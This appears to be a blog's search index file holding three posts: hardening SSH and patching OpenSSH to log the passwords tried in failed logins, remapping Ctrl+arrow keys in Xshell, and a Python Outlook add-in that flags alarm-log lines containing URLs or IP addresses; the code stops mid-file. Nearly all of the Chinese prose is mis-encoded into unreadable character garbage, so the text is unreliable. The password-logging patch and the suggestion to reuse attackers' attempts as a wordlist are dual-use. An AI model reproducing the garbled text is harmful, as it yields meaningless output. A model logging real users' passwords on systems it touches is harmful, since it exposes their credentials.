<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ç»™VPSåŠ sshçˆ†ç ´è®°å½•</title>
    <url>/2015/03/30/2015-03-30/</url>
    <content><![CDATA[<h1 id="æ·»åŠ sshå¯†é’¥éªŒè¯"><a href="#æ·»åŠ sshå¯†é’¥éªŒè¯" class="headerlink" title="æ·»åŠ sshå¯†é’¥éªŒè¯"></a>æ·»åŠ sshå¯†é’¥éªŒè¯</h1><p>æœ€è¿‘å‘ç°ä¸ªäººVPSçš„sshæ—¥å¿—ä¸­æ€»æ˜¯æœ‰å¾ˆå¤šä¸æ˜IPçš„è¿æ¥è¯·æ±‚ï¼Œå¤©å¤©çˆ†ç ´sshä¹Ÿæ˜¯å¤Ÿå‹¤å¥‹çš„ã€‚<br>ä¸ºäº†é˜²æ­¢æŸå¤©VPSçœŸè¢«çˆ†äº†å…ˆç»™sshåŠ ä¸ªå¯†é’¥è®¤è¯ï¼Œé¦–å…ˆæ‰§è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<img src="/2015/03/30/2015-03-30/ssh-keygen.jpg" class="">
<p>å°†ç”Ÿæˆå¥½çš„å¯†é’¥å¯¹å¦¥å–„ä¿å­˜(åœ¨ç”Ÿæˆä¸­å¯é€‰å°†ç§é’¥ç”¨å£ä»¤åŠ å¯†)ã€‚<br>å°†å…¬é’¥(id_rsa.pub)ä¸Šä¼ åˆ°VPSä¸Šï¼Œå¹¶å°†å…¶å†…å®¹æ·»åŠ åˆ°å¯¹åº”ç™»å½•è´¦æˆ·çš„~/.ssh/authorized_keysæ–‡ä»¶ä¸­ï¼Œæ³¨æ„.sshç›®å½•çš„æƒé™æœ€å¥½æ˜¯700(æˆ‘çš„æ˜¯755å¥½åƒä¹Ÿè¡Œ)ï¼Œauthorized_keysçš„æƒé™å¿…é¡»æ˜¯600æˆ–644ã€‚è¿™é‡Œæƒé™é—®é¢˜å‘æ¯”è¾ƒå¤šï¼Œå±ä¸»è²Œä¼¼æ²¡å¤šå¤§é—®é¢˜(æˆ‘çš„ç™»å½•è´¦æˆ·ä¸æ˜¯rootï¼Œä½†æ–‡ä»¶å’Œç›®å½•çš„å±ä¸»éƒ½æ˜¯root)ã€‚<br>ä¿®æ”¹/etc/ssh/sshd_configæ–‡ä»¶ï¼Œåˆ†åˆ«ä¿®æ”¹å¦‚ä¸‹ä¸‰é¡¹:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
<p>ä¸€èˆ¬ä¸ç”¨rootç™»çš„è¯ä¹Ÿè®¾ç½®ä¸€ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure>
<p>é‡å¯sshdæœåŠ¡<br>æœ¬åœ°ç”¨Xshellæ·»åŠ åˆšæ‰ç”Ÿæˆçš„ç§é’¥å°±å¯ä»¥è¿æ¥VPSäº†(å¦‚æœè®¾ç½®äº†åŠ å¯†å£ä»¤åˆ™éœ€è¦è¾“å…¥å£ä»¤è§£å¯†ç§é’¥)ã€‚<br>æ­¤æ—¶æœ€åŸºæœ¬çš„è®¾ç½®å¯†é’¥ç™»å½•å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹open-sshçš„ä»£ç æ¥å®ç°è¾“å‡ºéªŒè¯é”™è¯¯æ—¶çš„å¯†ç ã€‚</p>
<h1 id="ä¿®æ”¹sshæºç "><a href="#ä¿®æ”¹sshæºç " class="headerlink" title="ä¿®æ”¹sshæºç "></a>ä¿®æ”¹sshæºç </h1><p>é¦–å…ˆåˆ‡æ¢åˆ°ä¸€ä¸ªä¸´æ—¶ç›®å½•æ‰§è¡Œapt-get source sshï¼Œæ‰§è¡Œå®Œåç›´æ¥æœ‰ä¸€ä¸ªopenssh-6.6p1/ ç›®å½•å’Œå‡ ä¸ªå‹ç¼©åŒ…(æˆ‘çš„VPSè£…çš„æ˜¯DigitalOceanå®˜æ–¹æä¾›çš„Ubuntué•œåƒ)ï¼Œè¿›å…¥æºç ç›®å½•åé¦–å…ˆå†™ä¸ªpatch:</p>
<img src="/2015/03/30/2015-03-30/patch-shot.jpg" class="">
<p>ç”¨sshå·¥ç¨‹å†…çš„logitæ¥å†™SYSLOGã€‚å†™å®Œpatchåå…ˆ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patch --dry-run &lt;sshlog.patch</span><br></pre></td></tr></table></figure>
<p>çœ‹æ˜¯å¦æœ‰é”™è¯¯ï¼Œæ²¡æœ‰é”™è¯¯çš„è¯å°±å¯ä»¥ç›´æ¥patchäº†ã€‚<br>åˆ°è¿™é‡Œå»ºè®®å…ˆå¤‡ä»½ä¸€ä¸‹/etc/sshæ–‡ä»¶å¤¹ï¼Œå†å»ºä¸ªVPSçš„å¿«ç…§ä»¥é˜²æ‚²å‰§ã€‚ã€‚ã€‚<br>åœ¨æºç ç›®å½•æ‰§è¡Œé…ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/man</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå‡ºé”™å°±å®‰è£…ç¼ºå°‘çš„è½¯ä»¶åŒ…ï¼Œä¸‹é¢æ˜¯æˆ‘å®‰è£…æ—¶ç¼ºå°‘çš„è½¯ä»¶åŒ…:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install zlib1g zlib1g.dev openssl libssl-dev</span><br></pre></td></tr></table></figure>
<p>(ä»¥ä¸Šæ˜¯ubuntuéä¸»æµå‘½åçš„åŒ…åã€‚ã€‚)<br>å…¶ä¸­å®‰libssl-devçš„æ—¶å€™åŠ äº†ä¸ª â€“fix-missingå‚æ•°æ‰æ²¡æœ‰å‡ºé”™ã€‚<br>configureé¡ºåˆ©å®Œæˆåæ‰§è¡Œmakeå’Œmake installï¼Œä¹‹åé‡å¯sshdæœåŠ¡(digitaloceançš„ubuntuä¸‹ç›´æ¥é‡å¯ssh)ã€‚<br>é‡å¯åå…ˆåˆ«æ€¥ç€é€€å‡ºï¼Œåœ¨å½“å‰ä¼šè¯ä¸‹å¯¹æ¯”å¤‡ä»½çš„sshé…ç½®å’Œæ–°ç”Ÿæˆçš„sshé…ç½®çš„ä¸åŒï¼Œæ ¹æ®éœ€è¦æ›´æ”¹ä¸€ä¸‹(è¿™é‡Œæœ€å¥½ä¸è¦æ”¹æ–°ç”Ÿæˆçš„å¯†é’¥ï¼Œæ”¹äº†ä»¥åå¯èƒ½å°±è¦æ¢å¤å¿«ç…§äº†ã€‚ã€‚ã€‚)ï¼Œç„¶åæ–°å¼€å‡ ä¸ªä¼šè¯çœ‹æ˜¯å¦èƒ½æˆåŠŸè¿ä¸ŠVPSã€‚</p>
<h1 id="æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥"><a href="#æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥" class="headerlink" title="æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥"></a>æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥</h1><p>ä»¥ä¸Šå®Œæˆåè¿˜è¦å†ä¿®æ”¹ä¸€äº›é…ç½®ï¼Œå…ˆåœ¨shadowé‡ŒæŠŠrootç¦äº†(å¯†ç å‰åŠ ä¸ª!å·)ï¼Œä¹‹åé‡æ–°ä¿®æ”¹sshd_configé…ç½®ï¼Œä¸»è¦æ³¨æ„ä»¥ä¸‹å‡ ä¸ªï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PermitRootLogin no</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile   %h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ä¸‹é¢è¿™è¡Œå®é™…ä¸Šæ˜¯é’ˆå¯¹æ‰€æœ‰å…¶ä»–è´¦æˆ·çš„ï¼Œ<br>æˆ‘çš„VPSä¸Šå°±2ä¸ªè´¦æˆ·ï¼Œä¸€ä¸ªrootä¸å…è®¸ç™»å½•å¹¶ä¸”æŠŠshadowåºŸäº†ï¼Œ<br>å¦ä¸€ä¸ªå¸¸ç”¨è´¦æˆ·åœ¨sudoersé‡Œï¼Œsudoersç»„ç™»å½•ç­–ç•¥å¦è¡Œé…ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
<p>åœ¨æ–‡ä»¶çš„æœ€å(è²Œä¼¼Matchæœ‰è¦æ±‚)æ·»åŠ å¦‚ä¸‹å†…å®¹: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Match Group sudo    #è¿™é‡Œå¯èƒ½ç»„åä¼šä¸ä¸€æ ·ï¼Œwheelã€sudoerä»€ä¹ˆçš„è§†æƒ…å†µè€Œå®š</span><br><span class="line">PasswordAuthentication no  #ç¦æ­¢sudoerså¯†ç ç™»å½•</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡å¦‚ä¸Šé…ç½®ååªè¦ç”¨æˆ·ååœ¨sudoeré‡ŒVPSæ˜¯ä¸å…è®¸å¯†ç ç™»å½•çš„ã€‚<br>æ­¤æ—¶å¦‚æœæ°å·§æœ‰äººåœ¨çˆ†ç ´ä½ çš„VPSä½ å¯ä»¥é€šè¿‡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -F /var/log/auth.log | grep sshlog</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°ï¼Œæœ‰äº›ä¸»æœºçš„æ—¥å¿—å¯èƒ½åœ¨/var/log/secureå†…ï¼Œå…·ä½“æƒ…å†µå‚ç…§syslog.confæˆ–rsyslog.confçš„é…ç½®ã€‚</p>
<img src="/2015/03/30/2015-03-30/brute-log.jpg" class="">
<p>æ„Ÿå—åˆ°äº†ä¸–ç•Œæ·±æ·±çš„æ¶æ„ã€‚ã€‚ã€‚</p>
<p>å¯ä»¥å†™ä¸ªè„šæœ¬æˆ–ç¨‹åºæ¥å®šæœŸæå–è¿™äº›å¯†ç è®°å½•ï¼Œé€ä¸Šé—¨çš„å­—å…¸ä¸è¦ç™½ä¸è¦ã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>xshellè®¾ç½®ctrl+ â†‘ â†“</title>
    <url>/2015/04/08/2015-04-08/</url>
    <content><![CDATA[<p>ç”±screenè½¬tmuxï¼Œä½¿ç”¨çš„æ—¶å€™å‘ç°tmuxçš„paneå¤§å°åªèƒ½å·¦å³è°ƒèŠ‚ä¸èƒ½ä¸Šä¸‹è°ƒèŠ‚ï¼Œå„ç§æœç´¢åå‘ç°æ˜¯xshellçš„é—®é¢˜ï¼Œ<strong>xshell</strong>è¿™ä¸ªå‘ç«Ÿç„¶ä¸å“åº”ctrl+upå’Œctrl+downã€‚ã€‚ã€‚<br>åœ¨centosä¸‹terminalé‡Œcatï¼Œç„¶åè¾“å…¥ctrl+up å›è½¦ å’Œ ctrl+down å›è½¦ï¼Œåˆ†åˆ«å¾—åˆ°â€\x1B[1;5Aâ€å’Œâ€\x1B[1;5Bâ€ï¼Œå…¶ä¸­\x1Bä»£æŒ‡æ§åˆ¶ç¬¦ESCï¼Œå¯ä»¥é€šè¿‡Alt+27æŒ‰å‡ºæ¥ã€‚å¤åˆ¶è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œxshellå·¥å…·-&gt;é€‰é¡¹-&gt;é”®ç›˜å’Œé¼ æ ‡-&gt;ç¼–è¾‘-&gt;æ–°å»ºï¼ŒåŠ å…¥ctrl+upï¼Œç±»å‹é€‰æ‹©å‘é€å­—ç¬¦ä¸²ï¼Œç²˜è´´åˆšæ‰å¤åˆ¶çš„å¯¹åº”å­—ç¬¦ä¸²ï¼Œå®Œæˆã€‚</p>
<p>æŠ½ç©ºä¹°ä¸ªmbpå§ã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>outlooké‚®ä»¶è¿‡æ»¤æ’ä»¶</title>
    <url>/2015/07/15/2015-07-15/</url>
    <content><![CDATA[<p>å¤©å¤©æ”¶å‡ ç™¾å°å‘Šè­¦é‚®ä»¶ç®€ç›´ä¸èƒ½å¿ï¼Œåˆšå¥½æœ€è¿‘å­¦pyï¼Œç”¨pyå†™äº†ä¸ªoutlookæ’ä»¶ç»ƒç»ƒæ‰‹ã€‚<br>32ä½outlookï¼Œ32ä½python2.7ï¼Œ32ä½pywin32åº“ï¼Œä»¥pywin32å…³äºoutlookçš„ä¸€ä¸ªæ’ä»¶demoä½œåŸºç¡€æ”¹äº†æ”¹ï¼Œå®åœ¨ä¸ä¼švbaã€‚ã€‚ã€‚<br>å»é™¤äº†è„šæœ¬é‡Œçš„æ•æ„Ÿå†…å®¹ï¼Œé¡ºå¸¦æ³¨é‡Šå›½é™…åŒ–äº†ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Outlook logmail filter written by p011ux 20150630</span></span><br><span class="line"><span class="comment"># usage:</span></span><br><span class="line"><span class="comment"># python outlookAddin.py </span></span><br><span class="line"><span class="comment"># python outlookAddin.py --unregister</span></span><br><span class="line"><span class="comment"># python outlookAddin.py --debug</span></span><br><span class="line"><span class="comment"># debug info in	   PythonWin --&gt; Tools --&gt; Trace Collector Debugging Tool</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> win32com <span class="keyword">import</span> universal</span><br><span class="line"><span class="keyword">from</span> win32com.server.exception <span class="keyword">import</span> COMException</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> gencache, DispatchWithEvents</span><br><span class="line"><span class="keyword">import</span> winerror</span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> constants</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VersionInfo=<span class="string">u&quot;&quot;&quot;Log Filter Plugin v0.9 written by p011ux&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Forward to these email addr</span></span><br><span class="line">forwards=<span class="string">&#x27;&#x27;&#x27;alpha@company.com;beta@company.com&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># suspicious words,highlight line when match</span></span><br><span class="line">susp_words       =  u<span class="string">r&#x27;^(alpha|beta|else)\b&#x27;</span></span><br><span class="line">susp_words_white =  <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">susp_urls       =  u<span class="string">r&#x27;(://)|((\s|@)\d&#123;1,3&#125;(\.\d&#123;1,3&#125;)&#123;3&#125;)&#x27;</span></span><br><span class="line">susp_urls_white =  u<span class="string">r&#x27;\b((127(\.\d&#123;1,3&#125;)&#123;3&#125;(:(\d&#123;1,5&#125;)?)?\b)|(localhost(:\d&#123;1,5&#125;)?)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dict of blacklists and whitelists</span></span><br><span class="line">susp_dict=&#123;</span><br><span class="line">    <span class="string">&#x27;words&#x27;</span>:(susp_words,susp_words_white),\</span><br><span class="line">    <span class="string">&#x27;urls&#x27;</span>:(susp_urls,susp_urls_white),\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp folder</span></span><br><span class="line">BotFolder=<span class="string">&quot;_log_bot&quot;</span></span><br><span class="line"><span class="comment"># destination folder</span></span><br><span class="line">TargetFolder=<span class="string">&quot;_log&quot;</span></span><br><span class="line"><span class="comment"># log sender, only handle mails from these</span></span><br><span class="line">Log_Sender=(<span class="string">&quot;alarm-a&quot;</span>,<span class="string">&quot;alarm-b&quot;</span>)</span><br><span class="line"><span class="comment"># mail forward tag, make receiver easy to filter</span></span><br><span class="line">Log_Forward_Tag=<span class="string">&#x27;[log_tag] &#x27;</span></span><br><span class="line"></span><br><span class="line">log_usr=<span class="literal">None</span>      <span class="comment"># global dest obj</span></span><br><span class="line"><span class="comment"># Support for COM objects we use.</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;00062FFF-0000-0000-C000-000000000046&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Outlook 9</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;2DF8D04C-5BFA-101B-BDE5-00AA0044DE52&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Office 9</span></span><br><span class="line"></span><br><span class="line">outlookApp=<span class="literal">None</span>  <span class="comment">#outlook application object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TLB defiining the interfaces we implement</span></span><br><span class="line">universal.RegisterInterfaces(<span class="string">&#x27;&#123;AC0714F2-3D04-11D1-AE7D-00A0C90F26F4&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, [<span class="string">&quot;_IDTExtensibility2&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle content of mail,return a list which contains line numbers of matched.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suspicious</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">import</span> re                             <span class="comment"># for regex</span></span><br><span class="line">    liMatched=[]</span><br><span class="line">    body=item.Body.replace(<span class="string">u&#x27;\xa0&#x27;</span>,<span class="string">u&#x27; &#x27;</span>)  <span class="comment"># replace Â  in html format to space</span></span><br><span class="line">    body=body.replace(<span class="string">u&#x27;\r\n&#x27;</span>,<span class="string">u&#x27;\n&#x27;</span>)      <span class="comment"># traverse lines</span></span><br><span class="line">    cnt=<span class="number">0</span>                                 <span class="comment"># line counter</span></span><br><span class="line">    <span class="keyword">for</span> eachLine <span class="keyword">in</span> body.split(<span class="string">u&#x27;\n&#x27;</span>):</span><br><span class="line">        liLine=eachLine.split()           <span class="comment"># split to words</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">6</span>&gt;<span class="built_in">len</span>(liLine)):                <span class="comment"># get words[5]</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(liLine)):</span><br><span class="line">                <span class="built_in">print</span> <span class="built_in">len</span>(liLine),<span class="string">u&#x27;is less than 6&#x27;</span>,eachLine</span><br><span class="line">            cnt=cnt+<span class="number">1</span>                     <span class="comment"># line cnter</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        cmd=<span class="string">u&#x27;&#x27;</span>                           <span class="comment"># recover words[5:]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> liLine[<span class="number">5</span>:]:</span><br><span class="line">            cmd+=i</span><br><span class="line">            cmd+=<span class="string">u&#x27; &#x27;</span></span><br><span class="line">        cmd=cmd[:<span class="number">-1</span>]                      <span class="comment"># remove last space</span></span><br><span class="line">        cmd=cmd.lower()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> susp_dict:</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">None</span> != re.search(susp_dict[i][<span class="number">0</span>],cmd)):                                      <span class="comment"># match blacklist</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="literal">None</span> == susp_dict[i][<span class="number">1</span>]) <span class="keyword">or</span> (<span class="literal">None</span> == re.search(susp_dict[i][<span class="number">1</span>],cmd))):   <span class="comment"># if no white or not match white</span></span><br><span class="line">                    liMatched.append(cnt)                                                    <span class="comment"># get current line num</span></span><br><span class="line">                    <span class="keyword">break</span>                                                                    <span class="comment"># next line</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;White list:\t&#x27;</span>,cmd                                                <span class="comment"># print out white match</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span>                         <span class="comment"># line cnter</span></span><br><span class="line">    <span class="comment">#now just return</span></span><br><span class="line">    <span class="keyword">return</span> liMatched</span><br><span class="line"></span><br><span class="line"><span class="comment"># adjust font and highlight</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reform</span>(<span class="params">item,linesRed</span>):</span></span><br><span class="line">    htmB=item.HTMLBody        <span class="comment"># get content</span></span><br><span class="line">    offset=htmB.find(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)   <span class="comment"># find main content</span></span><br><span class="line">    offset=offset+<span class="built_in">len</span>(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># adjust font size</span></span><br><span class="line">    sizeStr=<span class="string">&#x27;&lt;FONT SIZE=&#x27;</span>                           <span class="comment"># general setting: &lt;P&gt;&lt;FONT SIZE=2&gt;</span></span><br><span class="line">    offset=htmB.find(sizeStr)                       <span class="comment"># get FONT SIZE position</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> &lt; offset):                                 <span class="comment"># got it?</span></span><br><span class="line">        offset = offset + <span class="built_in">len</span>(sizeStr)              <span class="comment"># adjust offset</span></span><br><span class="line">        offend = htmB.find(<span class="string">&#x27;&gt;&#x27;</span>,offset)              <span class="comment"># get end pos</span></span><br><span class="line">        <span class="keyword">if</span>(offset &lt; offend):                        <span class="comment"># got end?</span></span><br><span class="line">            fontsize = <span class="built_in">int</span>(htmB[offset:offend])     <span class="comment"># get font size int</span></span><br><span class="line">            htmB = htmB[:offset]+<span class="built_in">str</span>(fontsize+<span class="number">1</span>)+htmB[offend:]    <span class="comment"># size+=1</span></span><br><span class="line">            offset = offend + <span class="built_in">len</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># highlight</span></span><br><span class="line">    linesRed=<span class="built_in">sorted</span>(linesRed)           <span class="comment"># sort line nums</span></span><br><span class="line">    cnt=<span class="number">0</span>                               <span class="comment"># cnter</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(cnt <span class="keyword">in</span> linesRed):            <span class="comment"># match</span></span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            offset = htmB.find(<span class="string">&#x27;&lt;BR&gt;&#x27;</span>,offset)</span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;/font&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            </span><br><span class="line">        offset = htmB.find(<span class="string">&#x27;\n&#x27;</span>,offset) + <span class="built_in">len</span>(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># next</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; linesRed[<span class="number">-1</span>] <span class="keyword">or</span> offset &gt;= <span class="built_in">len</span>(htmB)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">    item.HTMLBody=htmB</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle mail item</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleItem</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sender=item.SenderName</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> sender <span class="keyword">in</span> Log_Sender):</span><br><span class="line">            <span class="comment"># not alarm</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">        linesMatched=suspicious(item)    <span class="comment"># match</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==<span class="built_in">len</span>(linesMatched)):        <span class="comment"># no match?</span></span><br><span class="line">            <span class="comment"># irrelevant log, delete</span></span><br><span class="line">            <span class="comment"># print &#x27;Deleting&#x27;,item.Subject</span></span><br><span class="line">            item.Delete()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        reform(item,linesMatched)        <span class="comment"># edit mail</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">None</span> != log_usr):       	 <span class="comment"># forward mail and move it to destination folder</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(forwards)):</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">None</span>!=outlookApp):</span><br><span class="line">                    sendForward=outlookApp.CreateItem(constants.olMailItem)<span class="comment">#item.Forward()</span></span><br><span class="line">                    sendForward.Subject=Log_Forward_Tag+item.SenderName</span><br><span class="line">                    sendForward.To=forwards</span><br><span class="line">                    sendForward.HTMLBody=item.HTMLBody</span><br><span class="line">                    sendForward.DeleteAfterSubmit=<span class="literal">True</span></span><br><span class="line">                    sendForward.Send()   </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;outlookApp is None&#x27;</span>                </span><br><span class="line">            item=item.Move(log_usr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;log_usr is None&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="comment"># when registered with python.exe %0 --debug , print to Python Trace Collector</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error handling&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;in FolderEvent&quot;</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># about</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ButtonEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnClick</span>(<span class="params">self, button, cancel</span>):</span></span><br><span class="line">        <span class="comment"># print &#x27;ButtonEvent&#x27;</span></span><br><span class="line">        <span class="keyword">import</span> win32ui</span><br><span class="line">        win32ui.MessageBox(VersionInfo,<span class="string">u&quot;ABOUT&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> cancel</span><br><span class="line"></span><br><span class="line"><span class="comment"># callbacks</span></span><br><span class="line"><span class="comment"># handle mail when new mail arrived in specified folder, delete if not suspicious</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FolderEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnItemAdd</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        handleItem(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove permanently when mail with specified sender arrived in Deleted box</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DeletedEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnItemAdd</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="comment"># print &#x27;DeletedEvent&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print &#x27;Deleted:&#x27;,item.Subject,&#x27;From:&#x27;,item.SenderName</span></span><br><span class="line">            <span class="keyword">if</span>(item.SenderName <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                item.Delete()</span><br><span class="line">        <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Delete&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted error.&quot;</span>,e</span><br><span class="line">        </span><br><span class="line"><span class="comment"># initialize each callback</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutlookAddin</span>:</span></span><br><span class="line">    _com_interfaces_ = [<span class="string">&#x27;_IDTExtensibility2&#x27;</span>]</span><br><span class="line">    _public_methods_ = []</span><br><span class="line">    _reg_clsctx_ = pythoncom.CLSCTX_INPROC_SERVER</span><br><span class="line">    _reg_clsid_ = <span class="string">&quot;&#123;0F47D9F3-598B-4d24-B7E3-92AC15ED27E2&#125;&quot;</span></span><br><span class="line">    _reg_progid_ = <span class="string">&quot;Python.Test.OutlookAddin&quot;</span></span><br><span class="line">    _reg_policy_spec_ = <span class="string">&quot;win32com.server.policy.EventHandlerPolicy&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnConnection</span>(<span class="params">self, application, connectMode, addin, custom</span>):</span></span><br><span class="line">        <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">        outlookApp=application</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;OnConnection&#x27;</span></span><br><span class="line">        <span class="comment"># ActiveExplorer may be none when started without a UI (eg, WinCE synchronisation)</span></span><br><span class="line">        activeExplorer = application.ActiveExplorer()</span><br><span class="line">        <span class="keyword">if</span> activeExplorer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registering button&#x27;</span></span><br><span class="line">            bars = activeExplorer.CommandBars</span><br><span class="line">            toolbar = bars.Item(<span 